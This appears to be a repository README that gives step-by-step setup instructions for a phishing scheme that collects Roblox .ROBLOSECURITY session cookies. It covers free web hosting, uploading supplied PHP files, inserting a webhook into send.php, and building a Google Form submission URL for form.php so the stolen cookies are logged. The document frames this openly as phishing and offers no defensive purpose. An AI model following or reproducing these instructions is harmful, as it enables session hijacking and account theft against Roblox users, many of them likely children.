# Google-Form-Method
A google form phising method for logging .ROBLOSECURITY cookie

# How It Works
First get a webhosting site for free id recommend 000webhostapp or infinityfree

First of all, delete the "public_html" folder by clicking on it and then press the Trash Can on the top bar.
Next, insert a folder with a new folder option. Name the newly created folder "public_php"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Open the new folder you have made, click on it and then press the Open button on the top bar once again.
Now, here comes the fun part. Download all of these provided files below.

Then press the Upload Files button, press select files and then select all of the downloaded files, after that press Upload and then wait until it is done.
Open the file named "send.php" and then press Ctrl + F. Type "yourwebhook" in the box and then press enter.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Put your prepared webhook and then put it in the highlighted part.
After that press "Save & Close"

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Next step! Go to https://docs.google.com/forms/u/0/ and then click new form. After creating a new form, you can customize it however you want, go crazy. Now, press the preview (eye icon) button at the top right corner.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

After that press Ctrl + U on the page, press Ctrl + F on the new page that you got redirected to, and look for "form action=" It should look something like this form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSc4NPbI6X_Nc8yS89t86hLNjwQbk_JzfI3fFPbGHBL8whOmsg/formResponse

Found it? Copy the URL and then paste it onto a notepad or somewhere.
After that go back to the preview page and then press Ctrl + Shift + I. What you are looking for this time is entry.(numbers) It should look something like this <input type="hidden" name="entry.895940829" value=""> Ok, this time, copy the entry.895940829 of yours and then paste it in the name notepad as the previous URL.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Now the full address will be constructed as follows:
[actionURL]?[entry]=

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


In my case the full URL looked like this:
https://docs.google.com/forms/d/e/url/formResponse?entry.1928374650=

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Now that you have got that, open "form.php" and then paste the link you constructed on the part that is yoururlhere, Press "Save & Close"
And that's it, you have set up the method!
